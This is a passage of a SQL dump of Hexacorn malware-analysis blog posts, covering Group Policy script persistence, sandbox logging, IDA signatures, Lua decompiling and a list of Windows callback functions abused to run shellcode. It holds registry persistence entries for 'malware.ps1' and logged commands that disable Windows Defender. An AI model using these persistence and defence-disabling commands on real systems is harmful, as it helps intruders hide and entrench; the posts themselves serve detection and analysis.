Policy\\State\\Machine\\Scripts\\Startup\\0\\0\n\n\"Script\"=\"malware.ps1\"\r\n\"Parameters\"=\"\"\r\n\"ExecTime\"=hex(b):00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nGroup Policy\\Scripts\\Startup\\0\\0\n\n\"Script\"=\"malware.ps1\"\r\n\"Parameters\"=\"\"\r\n\"IsPowershell\"=dword:00000001\r\n\"ExecTime\"=hex(b):00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\\nHistory\\{42B5FAAE-6536-11d2-AE5A-0000F87571E3}\\0\n\n\"Options\"=dword:00000000\r\n\"Version\"=dword:00010001\r\n\"DSPath\"=\"LocalGPO\"\r\n\"FileSysPath\"=\"C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\Machine\"\r\n\"DisplayName\"=\"Local Group Policy\"\r\n\"Extensions\"=\"[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]\"\r\n\"Link\"=\"Local\"\r\n\"GPOName\"=\"Local Group Policy\"\r\n\"GPOLink\"=dword:00000001\r\n\"lParam\"=dword:00000000\nThe ’42B5FAAE-6536-11d2-AE5A-0000F87571E3′ GUID is associated with a component named ‘ProcessScriptsGroupPolicy’.\nAfter restarting the system we can immediately see that the script was launched:\nWe can confirm it’s indeed our script by inspecting the properties of powershell.exe process pointing to our test script (since it waits for the key to be pressed it just runs idle in a background):\nThe good news is that Autoruns already detects these entries:\nWe are now half way through, so bear with me :).\nThere can be 2 PSScripts.ini on the system – the second configured for (all) the users. If you go back to to the gpedit.msc dialog box, you can browse the user configuration as well:\nThe 2 events that Powershell scripts can be associated with are ‘Logon’ and ‘Logoff’. When we now add a similar test script we will achieve persistence that will be attached to one or both of these events.\nI don’t describe it here, but it’s possible to decide in what sequence the script.ini and PSscript.ini should be processed.\nBack to our User-specific scripts. The artifacts can be found in the Registry under the following keys:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\\nState\\[SID]\\Scripts\n\nand the files are in a pretty much same place as the system-specific scripts:\n\nc:\\Windows\\System32\\GroupPolicy\n\nThe file system tree where the scripts are located looks like this:\n├───Machine\r\n│   └───Scripts\r\n│       ├───Shutdown\r\n│       └───Startup\r\n└───User\r\n    └───Scripts\r\n        ├───Logoff\r\n        └───Logon\nLast, but not least – the latest Autoruns doesn’t seem to be detecting the user-specific scripts.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/01/07/beyond-good-ol-run-key-part-52/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (122, 'Permanent Link to Enter Sandbox – part 13: Sometimes it’s better to unfollow…', 'Hexacorn', 'December 31, 2016 ', 'The golden rule for many sandboxes is to attach the monitor to a every piece of executable code that is spawn by the analyzed sample. This approach has its obvious merits – many samples use lots of trickery and ‘seeing it all’ is a definite plus. It is also an unique selling point for some sandboxes to be able to ‘catch’ the most trickiest evasions that could otherwise potentially sneak-in under the radar of the monitor and do the evil thing while the sandbox would report nada…\nI’d like to suggest a small, configurable optimization change to the sandbox behavior. One that should be relatively easy to implement for the most common use cases, and one that may be quite beneficial for readability and processing purposes.\nIts name is ‘Unfollow’.\nLet’s have a quick look at the below example:\nRetrieves Module handle (via GetModuleHandleA): kernel32\r\nRetrieves Procedure Address (via GetProcAddress): KERNEL32.dll, CreateProcessA\r\nRetrieves Module handle (via GetModuleHandleA): kernel32\r\nRetrieves Procedure Address (via GetProcAddress): KERNEL32.dll, GetModuleFileNameA\r\nLoads Library (via LoadLibraryA): Shell32.dll\r\nRetrieves Procedure Address (via GetProcAddress): SHELL32.dll, SHGetFolderPathA\r\nRetrieves Module handle (via GetModuleHandleA): kernel32\r\nRetrieves Procedure Address (via GetProcAddress): KERNEL32.dll, CreateProcessA\r\nCreates Process (via CreateProcessA): , cmd=sc stop WinDefend, flags=\r\nRetrieves Module handle (via GetModuleHandleA): kernel32\r\nRetrieves Procedure Address (via GetProcAddress): KERNEL32.dll, CreateProcessA\r\nCreates Process (via CreateProcessA): , cmd=sc config WinDefend start= disabled, flags=\r\nRetrieves Module handle (via GetModuleHandleA): kernel32\r\nRetrieves Procedure Address (via GetProcAddress): KERNEL32.dll, CreateProcessA\r\nCreates Process (via CreateProcessA): , cmd=net stop msmpsvc, flags=\nThe story the log tells us is pretty clear – the sample is launching ‘sc’ and ‘net’ commands to kill/change the config of security services:\n\nsc stop WinDefend\nsc config WinDefend start= disabled\nnet stop msmpsvc\n\nLook how clear the malicious behavior it is, and how easy it is to cherry-pick it from the logs, even in a textual format! Running a full-blown monitor over the spawn ‘utilities’ would be completely unnecessary… (unless of course, you want full report on IOCs, etc.).\nIn this particular case, my monitor just continues w/o following the programs the malware spawns i.e. recognizes their presence, but ‘unfollows’ them.\nAnd what would happen if these were to be followed?\nLet’s look at another example – the malware is executed, it connects to SCM, and first tries to Open, and if it doesn’t exist, Create the service called ‘vom’:\nConnects to SCM database (via OpenSCMManagerA)\r\nOpens a service (via OpenServiceA): vom\r\nCreates Service (via CreateServiceA): vom\r\n\n– at this moment the monitor would need to start monitoring the ‘services.exe’ that is responsible for service creation:\nservices.exe\r\n...\r\nCreates/Opens Registry Key: vom\r\nSets Registry Value (via NtSetValueKey): HKEY_LOCAL_MACHINE\\SYSTEM\\\r\n     ControlSet001\\Services\\vom\\Type, REG_DWORD, 1\r\nSets Registry Value (via NtSetValueKey): HKEY_LOCAL_MACHINE\\SYSTEM\\\r\n     ControlSet001\\Services\\vom\\Start, REG_DWORD, 0\r\nSets Registry Value (via NtSetValueKey): HKEY_LOCAL_MACHINE\\SYSTEM\\\r\n     ControlSet001\\Services\\vom\\ErrorControl, REG_DWORD, 1\r\nSets Registry Value (via NtSetValueKey): HKEY_LOCAL_MACHINE\\SYSTEM\\\r\n     ControlSet001\\Services\\vom\\ImagePath, REG_EXPAND_SZ, \r\n     system32\\drivers\\vom.sys\r\nSets Registry Value (via NtSetValueKey): HKEY_LOCAL_MACHINE\\SYSTEM\\\r\n     ControlSet001\\Services\\vom\\DisplayName, REG_SZ, vom\r\nCreates/Opens Registry Key: Security\r\nSets Registry Value (via NtSetValueKey): HKEY_LOCAL_MACHINE\\SYSTEM\\\r\n     ControlSet001\\Services\\vom\\Security\\Security, REG_BINARY,\r\n...\r\nand many many logs for all services affected\nFrom the full-IOC report perspective – it makes sense, but if we talk about in-depth analysis where very specific high-level info is needed it actually adds a lot of noise to the report. We actually want to know what the sample does. Not how the service creation works (of course, it’s interesting, but not at this stage!).\nAgain, I emphasize it could be an optional setting – one that could enable individual analysts to speed up the log analysis by removing a lot of clutter from the final report, and perhaps enable the sandbox to ‘see’ more (as CPU cycles required by the ‘utility’ process monitoring and logging can be fully delegated to the main malware during – the typically short – session time). Of course, many modern reports can be ‘collapsed’ to hide the artifacts that are not that interesting + the process hierarchy is typically clearly shown on a graph, or a tree, but still – following processes is quite CPU-expensive and not always necessary.\nShare this :)', 'Batch Analysis, Clustering, Sandboxing', 'http://www.hexacorn.com/blog/2016/12/31/enter-sandbox-part-13-sometimes-its-better-to-unfollow/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (123, 'Permanent Link to IDA, function alignment and signatures that don’t work…', 'Hexacorn', 'December 27, 2016 ', 'More and more malware is compiled with the more recent Visual Studio versions and often as 64-bit portable executables. It’s a commonly known fact that the official flirt signatures may not be yet available for some of these libraries. To address this, I often compile my own sigs based on available SDK and VS libraries. I have done it a few times before and since I recently came across a standard function that my libs didn’t recognize I decided to build yet another sig file.\nA standard, routine task.\nI quickly identified the version of VC the portable executable was built with, got the appropriate libcmt.lib, built the .pat file, confirmed the signature is present and matches ‘my’ unrecognized function, and compiled the final .sig file.\nTo my surprise, the sigs didn’t work and despite my efforts I couldn’t make them work. I eventually asked Hex-Rays for support and in the end they provided a detailed explanation as they identified the root cause of the issue: the alignment bytes (Thanks to Ilfak for help).\nTo explain what it is, you have to look at the following example of the memset function:\nThe code is an excerpt from a memset .obj file inside the libcmt.lib.\nYou can immediately notice that there is a sequence of bytes prefixed with CC (int 3) at the top of the file.\nWhen you create a .pat signature file for it it will look like this:\nCCCCCCCCCCCC66660F1F840000000000488BC14983F80872530FB6D249B90101\nDA B01D 00FA :0010 memset :003E@ mset10 :004E@ mset20 :0060@ mset30\n:006C@ mset40 :0071@ mset50 :007B@ mset60 :0087@ mset70 :0090@\nmset80 :00C0@ mset90\n—\nAs you can see the signature includes the alignment bytes (these few CCs at the front of the sig).\nIf you now create a .sig file from such a .pat file you will get a signature file that will not work for many static occurrences of memset. If you run IDA with the -z4 option you may get messages stating that the function was skipped (‘skip func’).\nThe reason for this behavior is that the alignment is present not only in the .obj files, but also inside the portable executable files.\nAs such, you may come across a code sequence like this (inside a sample):\nThe actual memset function is prefixed with an alignment added by a compiler (but different than the one inside the .obj file), and this particular alignment sequence was already recognized by IDA – it has been properly named and wrapped up. However, this wrapped-up alignment overlaps with the full code of the actual function (remember from the .pat file that it has to be prefixed with that CC sequence representing the alignment inside the .obj file!). So, as a result of this overlap, the flirt signature will fail to recognize the memset function.\nLet’s look at the binary one more time:\nThis is how memset is ‘remembered’ by the .sig/.pat files (from the .obj file):\nAnd this is how it is present inside the sample – the highlighted part is the actual alignment that IDA already recognized and wrapped up for this particular sample:\n– that wrapped-up alignment basically ‘stole’ a few bytes that would normally be part of the ‘remembered’ alignment of the memset function recognizable by the .sig.\nThere are two solutions at least:\n\ncreate signatures w/o alignment bytes (need a fix to the IDA pcf.exe tool)\nundefine the alignments done by IDA\n\nThe first one may be addressed in the future versions of IDA. The second option is actually very easy – if you come across a similar situation consider running the below script first. It’s a quick & ugly hack that removes the alignments that IDA adds automatically. Once these are removed, the sigs should work (unless the issue is completely different, of course).\nimport idaapi\r\nimport idautils\r\n\r\nfor s in Segments():\r\n    segname = str(idc.SegName(s)).rstrip(\'\\x00\')\r\n    print \"Segment %s\" % segname\r\n    i = idc.SegStart(s)\r\n\r\n    while i<idc.SegEnd(s):\r\n       b = Byte (i)\r\n       if b==0xCC:\r\n          a = GetDisasm(i)\r\n          if a.startswith(\'align\'):\r\n             print \"%08lX: %s, %x\" % (i, a,b)\r\n             MakeUnkn(i,0)\r\n       i=i+1\r\nprint \"Done\"\nShare this :)', 'Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2016/12/27/ida-function-alignment-and-signatures-that-dont-work/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (124, 'Permanent Link to Why decompiling LUA scripts doesn’t work all the time…', 'Hexacorn', 'December 22, 2016 ', 'In one of my posts this year I presented a bunch of decompiled LUA scripts associated with FLAME malware. The scripts were decompiled using the Lua decompiler – and since the decompilation process is non-trivial – it brings us closer to the subject of this post – how to work with the tool that doesn’t work all the time.\nFirst of all, the Lua Decompiler is only available as a source code and you need to compile it. This can be quite a big obstacle.\nI won’t go into details on how to compile it, but will mention that on a plain vanilla Ubuntu ISO (v16.0) it worked like a charm, but only after updating the environment with the developers’ tools and fixing a few things here and there (think: 2h of research and work at least). Most of the required steps require to install additional (missing packages). If you never compiled open source stuff  you are in for a big fun and lots of googling (think: 4-8h of your life \nSecondly, the compiled LUA scripts are a pain in the neck.\nWhy?\nThey store the size of various types in the header of the compiled LUA script. These types affect the way decompiler works.\nYes, you hear that right.\nTo decompile the byte-coded LUA script you need a version of Lua Decomiler that _matches_ the settings inside the header of a compiled LUA script!\nThe below is a fragment of Lua Decompiler code that refers to this – the header of Lua compiled script is not fixed and it depends on the actual architecture of the CPU and compiler settings:\n\n/*\r\n* make header\r\n*/\r\nvoid luaU_header (char* h)\r\n{\r\n int x=1;\r\n memcpy(h,LUA_SIGNATURE,sizeof(LUA_SIGNATURE)-1);\r\n h+=sizeof(LUA_SIGNATURE)-1;\r\n *h++=(char)LUAC_VERSION;\r\n *h++=(char)LUAC_FORMAT;\r\n *h++=(char)*(char*)&x;                /* endianness */\r\n *h++=(char)sizeof(int);\r\n *h++=(char)sizeof(size_t);\r\n *h++=(char)sizeof(Instruction);\r\n *h++=(char)sizeof(lua_Number);\r\n *h++=(char)(((lua_Number)0.5)==0);        /* is lua_Number integral? */\r\n}\n\nAn example of one of the Flame files (the header) is shown below:\nYou can quickly decipher that most of the structures are 4-bytes long i.e. 32-bit – as such you need a 32-bit version of LuaDec compiled for this particular version of compiled bytecode. In my tests I actually compiled various versions of LuaDec and preserved them for further use.\nThat’s it.\nThe best advice I can give you is to get the Luadec yourself and either compile it on a system with the architectural settings that match your compiled *.lua files, or tweak the compiler settings for Luadec to achieve the same result (I am not claiming this is possible as I have not tried it).\nI am not sure why Lua scripts are compiled this way, but it’s pretty much nonsensical as it’s not very portable. But if the interpreter for the specific encoded Lua script is incorporated into the final malicious package the devs don’t really need to care – it simply works out of the box for them.\nReversers – as it’s often the case – don’t have it that easy…\nShare this :)', 'Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2016/12/22/why-decompiling-lua-scripts-doesnt-work-all-the-time/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (125, 'Permanent Link to Shellcode. I’ll Call you back.', 'Hexacorn', 'December 17, 2016 ', 'Many malicious wrappers and position-independent payloads (especially based on AutoIT, and VB) attempt to use various techniques to execute the main payload evading the curious eyes of security solutions, and malware analysts. One of the most popular ways to execute the code in a more stealthy way relies on using a mechanism known as a ‘call back’. A typical call back is just a function address that is passed to a legitimate, most often a well-documented and innocent API function and then the call back function is executed internally when the API encounters a specific event the call back is set up to intercept.\nSome call backs are set up asynchronously and will be called in response to specific events f.ex. windows hooks execute a call back function when a key is pressed on the keyboard, a mouse moved, or a window maximized, and timer callbacks are called after a specific time interval passes. Others are executed synchronously by a given API that relies on the call back mechanism to allow the callback function to intercept some data while enumerating certain properties of the system (f.ex. popular lately EnumDateFormats). The latter are the most commonly call back functions used by the wrappers.\nSince this trick is popular and kinda stealthy + makes things a bit harder to analyze… every once in a while a ‘new’ type of malware pops up using a previously unknown, or barely known call back function which – in return – obviously triggers an interest of the malware analysts all over the place.\nIt crossed my mind that it would be cool to list all possible (or, more precisely: all documented) call back functions giving us at least a theoretical knowledge of what is out there. And this is what this post is about. While the list doesn’t cover everything, it certainly covers a lot – it includes 500+ call back functions documented in MSDN and on Microsoft web site, or elsewhere. Hopefully, a good start to include these in sandboxing solutions and API monitors of any sort.\nAs usual, if you spot any mistake in the list, please let me know and I’ll fix it. Thanks!\nHere’s the list:\n\nacmDriverEnumCallback\nacmDriverProc\nacmFilterChooseHookProc\nacmFilterEnumCallback\nacmFilterTagEnumCallback\nacmFormatChooseHookProc\nacmFormatEnumCallback\nacmFormatTagEnumCallback\nacmStreamConvertCallback\nAddInterface\nAddPropSheetPageProc\nAddSecureMemoryCacheCallback\nagePaintHook\nageSetupHook\nAllocateMemory\nAPCProc\nApplicationRecoveryCallback\nApplyCallbackFunction\nasswordChangeNotify\nasswordFilter\nAuthzAccessCheckCallback\nAuthzComputeGroupsCallback\nAuthzFreeGroupsCallback\nBindIoCompletionCallback\nBlockConvertServicesToStatic\nBlockDeleteStaticServices\nBrowseCallbackProc\nBufferCallback\nCallWndProc\nCallWndRetProc\ncapControlCallback\ncapErrorCallback\ncapStatusCallback\ncapVideoStreamCallback\ncapWaveStreamCallback\ncapYieldCallback\nCBTProc\nCCHookProc\nCertChainFindByIssuerCallback\nCertDllOpenStoreProv\nCertEnumPhysicalStoreCallback\nCertEnumSystemStoreCallback\nCertEnumSystemStoreLocationCallback\nCertStoreProvCloseCallback\nCertStoreProvDeleteCertCallback\nCertStoreProvDeleteCRLCallback\nCertStoreProvDeleteCTL\nCertStoreProvFindCert\nCertStoreProvFindCRL\nCertStoreProvFindCTL\nCertStoreProvFreeFindCert\nCertStoreProvFreeFindCRL\nCertStoreProvFreeFindCTL\nCertStoreProvGetCertProperty\nCertStoreProvGetCRLProperty\nCertStoreProvGetCTLProperty\nCertStoreProvReadCertCallback\nCertStoreProvReadCRLCallback\nCertStoreProvReadCTL\nCertStoreProvSetCertPropertyCallback\nCertStoreProvSetCRLPropertyCallback\nCertStoreProvSetCTLProperty\nCertStoreProvWriteCertCallback\nCertStoreProvWriteCRLCallback\nCertStoreProvWriteCTL\nCFHookProc\nClaimMediaLabel\nCleanupGroupCancelCallback\nClientCallback\nClientCallback_Function\nCloseServiceEnumerationHandle\nCollectPerformanceData\nCompletionProc\nConnectClient\nControlCallback\nCopyProgressRoutine\nCounterPathCallBack\nCQPageProc\nCreateServiceEnumerationHandle\nCreateStaticService\nCryptGetSignerCertificateCallback\nCRYPT_ENUM_KEYID_PROP\nCRYPT_ENUM_OID_FUNCTION\nCRYPT_ENUM_OID_INFO\nCRYPT_RETURN_HWND\nCRYPT_VERIFY_IMAGE\nCspGetDHAgreement\nDavAuthCallback\nDavFreeCredCallback\nDavRegisterAuthCallback\nDavUnregisterAuthCallback\nDdeCallback\nDdeEnableCallback\nDeleteInterface\nDeleteStaticService\nDemandDialRequest\nDhcpAddressDelHook\nDhcpAddressOfferHook\nDhcpControlHook\nDhcpDeleteClientHook\nDhcpHandleOptionsHook\nDhcpNewPktHook\nDhcpPktDropHook\nDhcpPktSendHook\nDhcpServerCalloutEntry\nDialogProc\nDigestFunction\nDisassociateCurrentThreadFromCallback\nDisconnectClient\nDllCallbackProc\nDllGetClassObject\nDoUpdateRoutes\nDoUpdateServices\nDPA_DestroyCallback\nDPA_EnumCallback\nDrawStateProc\nDriverCallback\nDSA_DestroyCallback\nDSA_EnumCallback\nDSEnumAttributesCallback\nEditStreamCallback\nEditWordBreakProc\nEditWordBreakProcEx\nEmbeddedUIHandler\nEnableCallback\nEnhMetaFileProc\nEnumCalendarInfoProc\nEnumCalendarInfoProcEx\nEnumCalendarInfoProcExEx\nEnumChildProc\nEnumCodePagesProc\nEnumDateFormatsProc\nEnumDateFormatsProcEx\nEnumDateFormatsProcExEx\nEnumDesktopProc\nEnumDirTreeProc\nEnumerateGetNextService\nEnumerateLoadedModulesProc64\nEnumFontFamExProc\nEnumFontFamProc\nEnumFontsProc\nEnumGeoInfoProc\nEnumICMProfilesProcCallback\nEnumInputContext\nEnumLanguageGroupLocalesProc\nEnumLanguageGroupsProc\nEnumLocalesProc\nEnumLocalesProcEx\nEnumMetaFileProc\nEnumObjectsProc\nEnumPageFilesProc\nEnumRegisterWordProc\nEnumResLangProc\nEnumResNameProc\nEnumResTypeProc\nEnumThreadWndProc\nEnumTimeFormatsProc\nEnumTimeFormatsProcEx\nEnumUILanguagesProc\nEnumWindowsProc\nEnumWindowStationProc\nEventCallback\nEventClassCallback\nEventRecordCallback\nEvent_Handler_Function_Name\nEVT_SUBSCRIBE_CALLBACK\nExportCallback\nFaxLineCallback\nFaxRouteAddFile\nFaxRouteDeleteFile\nFaxRouteEnumFile\nFaxRouteEnumFiles\nFaxRouteGetFile\nFaxRouteModifyRoutingData\nFaxRoutingInstallationCallback\nFaxSendCallback\nFAX_RECIPIENT_CALLBACK\nFExecuteInAppDomainCallback\nFiberProc\nFileIOCompletionRoutine\nFILE_RESTORE_CALLBACK\nFindDebugInfoFileProc\nFindExecutableImageProc\nFLockClrVersionCallback\nFlsCallback\nFNCCERTDISPLAYPROC\nFNCFILTERPROC\nFNCMFILTERPROC\nFNCMHOOKPROC\nFNDAENUMCALLBACK\nFNDPAENUMCALLBACK\nFNDSAENUMCALLBACK\nFNPEER_FREE_SECURITY_DATA\nFNPEER_SECURE_RECORD\nFNPEER_VALIDATE_RECORD\nFN_AUTHENTICATION_CALLBACK\nFN_AUTHENTICATION_CALLBACK_EX\nFN_BLUETOOTH_ENUM_ATTRIBUTES_CALLBACK\nFN_CDF_PARSE_ERROR_CALLBACK\nFN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK\nFN_CERT_DLL_OPEN_STORE_PROV_FUNC\nFN_CERT_ENUM_PHYSICAL_STORE\nFN_CERT_ENUM_SYSTEM_STORE\nFN_CERT_STORE_PROV_CLOSE\nFN_CERT_STORE_PROV_DELETE_CERT\nFN_CERT_STORE_PROV_DELETE_CRL\nFN_CERT_STORE_PROV_READ_CERT\nFN_CERT_STORE_PROV_READ_CRL\nFN_CERT_STORE_PROV_SET_CERT_PROPERTY\nFN_CERT_STORE_PROV_SET_CRL_PROPERTY\nFN_CERT_STORE_PROV_SET_CTL_PROPERTY\nFN_CERT_STORE_PROV_WRITE_CERT\nFN_CERT_STORE_PROV_WRITE_CRL\nFN_CERT_STORE_PROV_WRITE_CTL\nFN_CRYPT_XML_CREATE_TRANSFORM\nFN_CRYPT_XML_DATA_PROVIDER_CLOSE\nFN_CRYPT_XML_DATA_PROVIDER_READ\nFN_CRYPT_XML_ENUM_ALG_INFO\nFN_CRYPT_XML_WRITE_CALLBACK\nFN_DEVICE_CALLBACK\nFN_WdsCliCallback\nFN_WdsCliTraceFunction\nFN_WdsTransportClientReceiveContents\nFN_WdsTransportClientReceiveMetadata\nFN_WdsTransportClientSessionComplete\nFN_WdsTransportClientSessionStart\nFN_WdsTransportClientSessionStartEx\nForegroundIdleProc\nFreeMemory\nFRHookProc\nFuncReturnhWnd\nFunctionTableAccessProc64\nFuncVerifyImage\nGenerateGroupPolicy\nGetApplicationRecoveryCallback\nGetEventMessage\nGetFirstOrderedService\nGetGlobalInfo\nGetInterfaceInfo\nGetMfeStatus\nGetModuleBaseProc64\nGetMsgProc\nGetNeighbors\nGetNextOrderedService\nGetRequest\nGetResponse\nGetServiceCount\nGetSize\nGetTSAudioEndpointEnumeratorForSession\ngluNurbsCallback\ngluQuadricCallback\ngluTessCallback\nGopherAttributeEnumerator\nHandlerEx\nHandlerRoutine\nhoneCallbackFunc\nhone_Event\nHyphenateProc\nICMProgressProcCallback\nImportCallback\nInitHelperDll\nInitializeChangeNotify\nInitializeEmbeddedUI\nInitOnceCallback\nInsertAt\nInstalluiHandler\nInstalluiHandlerRecord\nINSTALLUI_HANDLER\nInterfaceStatus\nInternetSetStatusCallback\nInternetStatusCallback\nINTERNET_STATUS_CALLBACK\nIoCompletionCallback\nIOProc\nIsService\nJournalPlaybackProc\nJournalRecordProc\nKeyboardProc\nlineCallbackFunc\nLineDDAProc\nLine_Event\nLOG_FULL_HANDLER_CALLBACK\nLOG_TAIL_ADVANCE_CALLBACK\nLOG_UNPINNED_CALLBACK\nLowLevelKeyboardProc\nLowLevelMouseProc\nLPCQADDFORMSPROC\nLPCQADDPAGESPROC\nLPCQPAGEPROC\nLPDISPLAYVAL\nLPDSENUMATTRIBUTES\nLPEVALCOMCALLBACK\nLPFNDFMCALLBACK\nLPFNVIEWCALLBACK\nMagGetImageScalingCallback\nMagImageScalingCallback\nMagSetImageScalingCallback\nMappingCallbackProc\nMaxMediaLabel\nMessageProc\nMFAddPeriodicCallback\nMFInvokeCallback\nMFPERIODICCALLBACK\nMFRemovePeriodicCallback\nMgmCreationAlertCallback\nMgmDisableIgmpCallback\nMgmJoinAlertCallback\nMgmLocalJoinCallback\nMgmLocalLeaveCallback\nMgmPruneAlertCallback\nMgmRpfCallback\nMgmWrongIfCallback\nMGM_ENABLE_IGMP_CALLBACK\nMibCreate\nMibDelete\nMIBEntryCreate\nMIBEntryDelete\nMIBEntryGet\nMIBEntryGetFirst\nMIBEntryGetNext\nMIBEntrySet\nMibGet\nMibGetFirst\nMibGetNext\nMibGetTrapInfo\nMibSet\nMibSetTrapInfo\nMidiInProc\nMidiOutProc\nMiniDumpCallback\nMMCFreeNotifyHandle\nMMCPropertyChangeNotify\nMMCPropertyHelp\nMMCPropPageCallback\nMMIOProc\nMonitorEnumProc\nMouseProc\nMRUCMPPROC\nMyStatusProc\nOFNHookProc\nOFNHookProcOldStyle\nOpenPerformanceData\nORASADFunc\nOutOfProcessExceptionEventCallback\nOutOfProcessExceptionEventDebuggerLaunchCallback\nOutOfProcessExceptionEventSignatureCallback\nOutputProc\nPIO_APC_ROUTINE\nQueryPower\nRadiusExtensionFreeAttributes\nRadiusExtensionInit\nRadiusExtensionProcess\nRadiusExtensionProcess2\nRadiusExtensionProcessEx\nRadiusExtensionTerm\nRASADFunc\nRasAdminAcceptNewConnection\nRasAdminConnectionHangupNotification\nRasAdminGetIpAddressForUser\nRasAdminReleaseIpAddress\nRasCustomDeleteEntryNotify\nRasCustomDial\nRasCustomDialDlg\nRasCustomEntryDlg\nRasCustomHangUp\nRasCustomScriptExecute\nRasDialFunc\nRasDialFunc1\nRasDialFunc2\nRasEapBegin\nRasEapEnd\nRasEapFreeMemory\nRasEapGetIdentity\nRasEapGetInfo\nRasEapInitialize\nRasEapInvokeConfigUI\nRasEapInvokeInteractiveUI\nRasEapMakeMessage\nRasFreeBuffer\nRasGetBuffer\nRasPBDlgFunc\nRasReceiveBuffer\nRasRetrieveBuffer\nRasSecurityDialogBegin\nRasSecurityDialogEnd\nRasSendBuffer\nRasSetCommSettings\nReaderScroll\nReadProcessMemoryProc64\nRegisterApplicationRecoveryCallback\nRegisterCallback\nRegisterProtocol\nRegisterWaitChainCOMCallback\nRemoveAt\nRemoveSecureMemoryCacheCallback\nRemoveTraceCallback\nrintHookProc\nRM_WRITE_STATUS_CALLBACK\nrocessGroupPolicy\nrocessGroupPolicyEx\nrogressNotificationCallback\nropEnumProc\nropEnumProcEx\nropSheetPageProc\nropSheetProc\nRpcAuthKeyRetrievalFn\nRpcMgmtAuthorizationFn\nRpcnotificationRoutine\nRpcObjectInqFn\nRPC_IF_CALLBACK_FN\nRtlInstallFunctionTableCallback\nRTM_ENTITY_EXPORT_METHOD\nRTM_EVENT_CALLBACK\nSampleCommand\nSampleCommit\nSampleConnect\nSampleDump\nSampleOsVersionCheck\nSampleStartHelper\nSampleStop\nSampleStopHelper\nSceSvcAttachmentAnalyze\nSceSvcAttachmentConfig\nSceSvcAttachmentUpdate\nSecureMemoryCacheCallback\nSendAsyncProc\nSendMessageCallback\nServiceMain\nSetAt\nSetGlobalInfo\nSetInterfaceInfo\nSetInterfaceReceiveType\nSetLineRecoCallback\nSetPower\nSetProviderStatusFunc\nSetProviderStatusInfoFreeFunc\nSetResponseType\nSetTraceCallback\nSetupDefaultQueueCallback\nSetupHookProc\nSetupInitDefaultQueueCallback\nSetupTermDefaultQueueCallback\nShellProc\nShutdownEmbeddedUI\nSimpleCallback\nSNMPAPI_CALLBACK\nSnmpExtensionClose\nSnmpExtensionInit\nSnmpExtensionInitEx\nSnmpExtensionMonitor\nSnmpExtensionQuery\nSnmpExtensionQueryEx\nSnmpExtensionTrap\nSoundSentryProc\nSP_FILE_CALLBACK\nStackSnapshotCallback\nStartComplete\nStartProtocol\nStatusCallback\nStatusMessageCallback\nStatusRoutine\nStopProtocol\nSymEnumerateModulesProc64\nSymEnumerateSymbolsProc64\nSymEnumLinesProc\nSymEnumProcessesProc\nSymEnumSourceFilesProc\nSymEnumSourceFileTokensProc\nSymEnumSymbolsProc\nSymFindFileInPathProc\nSymRegisterCallback\nSymRegisterCallbackProc64\nSymRegisterFunctionEntryCallback\nSymRegisterFunctionEntryCallbackProc64\nSyncUpdateProc\nSysMsgProc\nTaskDialogCallbackProc\nThreadProc\nTimeProc\nTimeProvClose\nTimeProvCommand\nTimeProvOpen\nTimerAPCProc\nTimerCallback\nTimerProc\nTranslateAddressProc64\nTranslateDispatch\nTrySubmitThreadpoolCallback\nUiaEventCallback\nUiaProviderCallback\nUiaRegisterProviderCallback\nUmsSchedulerProc\nUnbindInterface\nUndeleteFile\nUnregisterApplicationRecoveryCallback\nValidateRoute\nVectoredHandler\nVERIFYSERVERCERT\nWaitCallback\nWaitChainCallback\nWaitOrTimerCallback\nwaveInProc\nwaveOutProc\nWdsTransportClientRegisterCallback\nWdsTransportProviderCloseContent\nWdsTransportProviderCloseInstance\nWdsTransportProviderCompareContent\nWdsTransportProviderCreateInstance\nWdsTransportProviderDumpState\nWdsTransportProviderGetContentMetadata\nWdsTransportProviderGetContentSize\nWdsTransportProviderInitialize\nWdsTransportProviderOpenContent\nWdsTransportProviderReadContent\nWdsTransportProviderRefreshSettings\nWdsTransportProviderShutdown\nWdsTransportProviderUserAccessCheck\nWdsTransportServerRegisterCallback\nWinBioCaptureSampleWithCallback\nWinBioEnrollCaptureWithCallback\nWinBioIdentifyWithCallback\nWinBioLocateSensorWithCallback\nWinBioVerifyWithCallback\nWindowProc\nWinEventProc\nWinHttpSetStatusCallback\nWINHTTP_STATUS_CALLBACK\nWLAN_NOTIFICATION_CALLBACK\nWorkCallback\nWPUQueryBlockingCallback\nxeProviderInitialize\nxeProviderRecvRequest\nxeProviderServiceControl\nxeProviderShutdown\nxeRegisterCallback\n\nShare this :)', 'Anti-*, Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2016/12/17/shellcode-ill-call-you-back/\n');
